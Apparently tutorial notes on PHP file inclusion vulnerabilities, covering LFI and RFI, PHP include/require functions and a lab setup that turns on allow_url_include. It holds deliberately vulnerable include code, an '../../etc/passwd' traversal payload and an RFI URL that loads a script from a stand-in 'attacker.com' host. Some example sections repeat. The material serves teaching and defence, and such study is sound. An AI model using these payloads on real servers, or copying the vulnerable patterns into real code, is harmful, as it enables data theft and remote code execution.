
# File-Inclusion-Vulnerability

## File Inclusion Vulnerability

A **file inclusion vulnerability** is a security flaw in web applications that allows attackers to include or execute files on the server, often leading to unauthorized access or remote code execution.

---

## How File Inclusion Works

This vulnerability typically arises when an application incorporates a file path via user input without proper validation. Attackers exploit this by manipulating the input to redirect the application to include unintended files, either from the local server or remotely.

---

## Types of File Inclusion

- **Local File Inclusion (LFI):** The attacker includes files already present on the server. This can expose sensitive data, configurations, or even lead to code execution if an attacker can get their own file onto the server.
- **Remote File Inclusion (RFI):** The attacker includes files located on an external server (typically controlled by the attacker), allowing direct execution of malicious code on the victim server.

---

## Exploitation Examples

    **LFI Example:**
    $file = $_GET['file'];
    include('directory/' . $file);

An attacker could use a URL like `?file=../../etc/passwd` to try including sensitive local files.

    **RFI Example:**
    $test = $_REQUEST["testfile"];
    include($test.".php");

Here, an attacker could specify a remote URL to fetch and execute their malicious script.

---
## Impacts

- **Disclosure of sensitive data** (config files, passwords)
- **Remote code execution** on the server hosting the application
- **Website defacement, privilege escalation, or further system compromise**

---

## Prevention

- Never trust user-supplied input for file paths.
- Rigorously validate and sanitize all input.
- Use secure coding practices, such as whitelisting allowed files and not exposing file path parameters directly.


## Including and Requiring Files in PHP

PHP lets developers organize code by breaking it into reusable sections such as headers, footers, configuration files, functions, or layout sections.

Including and requiring files in PHP enables code reuse and better organization for elements like **functions, configuration, layout sections, reusable HTML/PHP code, CSS, and JavaScript**.

---

## Key PHP Include and Require Functions

- **include('file.php')**: Inserts and executes code from a specified file. If the file is missing, a warning is shown and the script continues.
- **include_once('file.php')**: Same as include, but ensures the file is included only once (even if called multiple times).
- **require('file.php')**: Similar to include, but if the file is missing, a fatal error occurs and the script halts.
- **require_once('file.php')**: Like require but includes the file only once, avoiding redeclaration errors or code execution repetition.

---

## Practical Uses

- **Functions**: Place reusable functions in separate files (e.g., `include_function.php`) and include them in multiple scripts to avoid redundancy.
- **Configuration**: Store settings like database connections in a config file and include it where needed.
- **Layout Sections**: Standard parts like headers, footers, or navigation menus can be stored in dedicated files (`include_header.php`, `include_footer.php`) and included on all pages for consistency.
- **Reusable HTML/PHP Code**: Common UI blocks, such as forms, login panels, or notices, are better managed with includes.
- **CSS and JavaScript**: Typically included via HTML `<link>` and `<script>` tags, but dynamic content or inline styles/scripts can be modularized using PHP includes.

---

## Example

    require_once("include_header.php");
   
    require_once("include_function.php");


The above ensures both the header and user-defined functions are included only once, avoiding errors in larger applications.

## Exploitation Examples

- **LFI Example:**
    ```
    $file = $_GET['file'];
    include('directory/' . $file);
    ```
    An attacker could use a URL like `?file=../../etc/passwd` to try including sensitive local files.

- **RFI Example:**
    ```
    $test = $_REQUEST["testfile"];
    include($test.".php");
    ```
    Here, an attacker could specify a remote URL to fetch and execute their malicious script.

---

# Remote-File-Inclusion(RFI)-in-PHP

## Remote File Inclusion (RFI) in PHP

Remote File Inclusion (RFI) is a critical vulnerability that allows an attacker to include and execute code from a remote server by exploiting PHP scripts that include files based on user input.

---

## Enabling RFI (for testing purposes only - not recommended in production)

1. Open the PHP configuration file (for example, PHP 7.3 on Apache):

    ```
    vim /etc/php/7.3/apache2/php.ini
    ```

2. Find and set the following directive:

    ```
    allow_url_include = On
    ```

3. Restart the Apache server to apply changes:

    ```
    systemctl restart apache2.service
    ```

---

## What does `allow_url_include` do?

| Configuration      | Description                                | Default Value | Risk Level                                    |
|--------------------|--------------------------------------------|--------------|-----------------------------------------------|
| allow_url_include  | Allows PHP to include remote files via URLs| Off          | High if set to On (can enable RFI attacks)    |

---

## Example of vulnerable PHP code

<?php $page = $_GET['page']; include($page); // Vulnerable to Remote File Inclusion if allow_url_include=On ?>
text

If `allow_url_include` is set to **On**, and an attacker requests:

http://example.com/index.php?page=http://attacker.com/malicious.php

text

The malicious PHP code hosted on the attacker's server will be executed on the victim's server.

---

## Security Recommendations

- Keep `allow_url_include` set to **Off** in production.
- Avoid including files based on unsanitized user input.
- Use whitelisting or strict validation for any file includes.
- Update PHP to versions where this feature is disabled by default.
